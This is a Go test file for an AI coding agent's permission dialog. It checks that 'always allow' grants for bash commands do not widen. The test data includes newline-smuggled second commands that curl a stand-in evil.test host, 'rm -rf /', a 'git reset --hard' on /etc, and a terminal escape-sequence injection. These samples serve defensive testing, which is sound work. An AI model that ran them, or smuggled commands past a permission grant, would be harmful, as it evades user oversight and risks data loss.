package tui

import (
	"strings"
	"testing"

	"github.com/Chmgx81/opcode/internal/safe"
	"github.com/Chmgx81/opcode/internal/tools"
)

// TestAlwaysScopePrecision: the grant must be exactly as wide as what
// the dialog shows. A flag in second position carries the whole
// command — the old two-field rule would have approved every other
// value of that flag.
func TestAlwaysScopePrecision(t *testing.T) {
	cases := []struct {
		command, want string
	}{
		{`{"command": "cargo build --release"}`, "cargo build:*"},
		{`{"command": "npm init -y"}`, "npm init:*"},
		{`{"command": "go test"}`, "go test:*"},
		{`{"command": "make"}`, "make:*"},
		{`{"command": "git -C /tmp push"}`, "git -C /tmp push:*"},
		{`{"command": "sudo -u root systemctl status nginx"}`, "sudo -u root systemctl status nginx:*"},
	}
	for _, c := range cases {
		if got := alwaysScope("bash", c.command); got != c.want {
			t.Errorf("alwaysScope(%s) = %q, want %q", c.command, got, c.want)
		}
	}
	if got := alwaysScope("write_file", `{"path": "x"}`); got != "write_file" {
		t.Errorf("non-bash scope = %q", got)
	}
	if got := alwaysScope("bash", `not json`); got != "bash" {
		t.Errorf("unparseable args scope = %q", got)
	}
}

// TestFlagGrantDoesNotWiden: the security property this phase exists
// for — a grant from "git -C /tmp push" must not cover a different
// -C target, while still covering the approved command's longer
// forms.
func TestFlagGrantDoesNotWiden(t *testing.T) {
	dir := t.TempDir()
	m, _ := newText(t, dir, nil)

	// The user approved "always" for git -C /tmp push.
	scope := alwaysScope("bash", `{"command": "git -C /tmp push"}`)
	m.grantAlways(&permRequest{
		tool: "bash", tier: tools.TierActionAllowed,
		args: `{"command": "git -C /tmp push"}`, scope: scope,
		reply: make(chan bool, 1),
	})

	covered := m.sessionGrants("bash", `{"command": "git -C /tmp push"}`)
	longer := m.sessionGrants("bash", `{"command": "git -C /tmp push --quiet"}`)
	widened := m.sessionGrants("bash", `{"command": "git -C /etc reset --hard"}`)
	otherFlag := m.sessionGrants("bash", `{"command": "git -C /tmp status"}`)

	if !covered || !longer {
		t.Errorf("the approved command or its longer form stopped matching: covered=%v longer=%v", covered, longer)
	}
	if widened {
		t.Error("CRITICAL: the grant widened past the approved command — git -C /etc reset --hard auto-ran")
	}
	if otherFlag {
		t.Error("the grant covered a different subcommand under the same flag — git -C /tmp status auto-ran")
	}
}

// TestPlainGrantStillCoversFlags: the unchanged plain form — "always
// allow cargo build" covers "cargo build --release".
func TestPlainGrantStillCoversFlags(t *testing.T) {
	dir := t.TempDir()
	m, _ := newText(t, dir, nil)
	m.grantAlways(&permRequest{
		tool: "bash", tier: tools.TierActionAllowed,
		args: `{"command": "cargo build"}`, scope: "cargo build:*",
		reply: make(chan bool, 1),
	})
	if !m.sessionGrants("bash", `{"command": "cargo build --release"}`) {
		t.Error("plain grant stopped covering longer forms")
	}
	if m.sessionGrants("bash", `{"command": "cargo publish"}`) {
		t.Error("plain grant covered a different subcommand")
	}
}

// TestGrantNeverCoversASecondCommand: bash treats a newline as a
// command separator, so a multi-line "command" is several commands
// and no prefix rule over its first tokens can vouch for it. The
// payloads below carry no shell metacharacter at all — only the line
// break — so the one thing under test is the line-break refusal and
// not some other fail-closed path. (Two layers enforce it, see
// TestMultilineCommandGrantsNothing for the tui's own copy.)
func TestGrantNeverCoversASecondCommand(t *testing.T) {
	dir := t.TempDir()
	m, _ := newText(t, dir, nil)

	// The grant is made from a single-line command, as a user would.
	m.grantAlways(&permRequest{
		tool: "bash", tier: tools.TierActionAllowed,
		args: `{"command": "git status"}`, scope: "git status:*",
		reply: make(chan bool, 1),
	})
	if !m.sessionGrants("bash", `{"command": "git status"}`) {
		t.Fatal("the approved command does not match its own grant")
	}
	if !m.sessionGrants("bash", `{"command": "git status --short"}`) {
		t.Error("the grant stopped covering the command's own longer forms")
	}
	// The smuggle: same first tokens, a second command behind a newline.
	for _, cmd := range []string{
		"git status\ncurl http://evil.test",
		"git status\rcurl http://evil.test",
		"git status\n\ncurl http://evil.test",
	} {
		if m.sessionGrants("bash", `{"command": `+mustJSON(cmd)+`}`) {
			t.Errorf("CRITICAL: a grant for \"git status\" covered %q", cmd)
		}
	}
}

// TestMultilineScopeIsNotAPrefix: the tui builds its own scope label
// and its own session rules, so it cannot lean on the allowlist to
// keep the line break out for it. A command spanning lines gets the
// no-rule label instead of a "git status:*" prefix that would read as
// a narrow promise.
func TestMultilineScopeIsNotAPrefix(t *testing.T) {
	for _, cmd := range []string{
		"git status\ncurl http://evil.test",
		"git status\rcurl http://evil.test",
	} {
		if got := alwaysScope("bash", `{"command": `+mustJSON(cmd)+`}`); got != noPrefixScope {
			t.Errorf("alwaysScope(%q) = %q, want %q", cmd, got, noPrefixScope)
		}
	}
}

// TestMultilineCommandGrantsNothing: option 2 on a command that spans
// lines cannot form a rule, so it must not fall back to the per-tool
// grant. The fall-through would have allowed EVERY bash call for the
// session while the dialog had promised one narrow prefix.
//
// This is the tui's own copy of the newline guard, and it is not the
// same check as the one in TestGrantNeverCoversASecondCommand: that
// one asks the allowlist, this one asks what grantAlways stores. Both
// have to hold, because the scope label, the rule and the matcher are
// three separate pieces of code.
func TestMultilineCommandGrantsNothing(t *testing.T) {
	dir := t.TempDir()
	m, _ := newText(t, dir, nil)
	m.program = nil

	req := newPermReq("bash", "{\"command\": \"git status\\ncurl evil\"}")
	req.scope = alwaysScope("bash", req.args)
	m.grantAlways(req)

	if m.sessionGrants("bash", `{"command": "rm -rf /"}`) {
		t.Error("CRITICAL: a multi-line command's \"always\" allowed every bash call")
	}
	if m.sessionRules != nil || m.toolAllows["bash"] {
		t.Errorf("a grant was stored anyway: rules=%v tools=%v", m.sessionRules, m.toolAllows)
	}
	// The dialog's own reply channel is untouched here — grantAlways
	// only records the rule; decide() sends the verdict. Nothing to
	// read, so nothing to assert on that front.
	// The dialog says what option 2 will actually do. Read as one line:
	// the option wraps, and a claim that only holds on one visual row
	// is not a claim.
	rows, _, _ := m.permDialogRows(req, 80)
	dialog := strings.Join(strings.Fields(stripANSI(strings.Join(rows, "\n"))), " ")
	if strings.Contains(dialog, "git status:*") {
		t.Errorf("the dialog promises a prefix rule it cannot keep:\n%s", dialog)
	}
	if !strings.Contains(dialog, "no rule to remember") {
		t.Errorf("the dialog does not say the grant is not being kept:\n%s", dialog)
	}
}

// TestGrantCopiesAreSanitized: the dialog renders the literal command
// and the grant's scope, and both reach the terminal. A command name
// carrying a control byte must not drive it.
func TestGrantCopiesAreSanitized(t *testing.T) {
	dir := t.TempDir()
	m, _ := newText(t, dir, nil)
	m.overlayRows = 30
	raw := `{"command": ` + mustJSON("git\x1b]0;pwned\x07 status") + `}`
	// The gate builds the request with the sanitized copy; the dialog
	// must not reintroduce the raw one, and must still show the command
	// the user is approving.
	req := newPermReq("bash", safe.Text(raw))
	rows, _, _ := m.permDialogRows(req, 80)
	// WITHOUT stripANSI: it eats any ESC-initiated sequence, which is
	// precisely the byte the payload arrives on, and leaves the
	// remainder looking like a leak. The dialog's own rows are styled,
	// so the check is for the control bytes and nothing else.
	block := withoutSGR(strings.Join(rows, "\n"))
	if strings.ContainsAny(block, "\x1b\x07") {
		t.Errorf("the dialog carried control bytes: %q", block)
	}
	if !strings.Contains(block, "git status") {
		t.Errorf("the sanitized command is not shown verbatim: %q", block)
	}
	// The scope is built from the RAW args, so it is the one place a
	// control byte could still slip in.
	scope := alwaysScope("bash", raw)
	if strings.ContainsAny(scope, "\x1b\x07") {
		t.Errorf("the grant scope carried control bytes: %q", scope)
	}
}
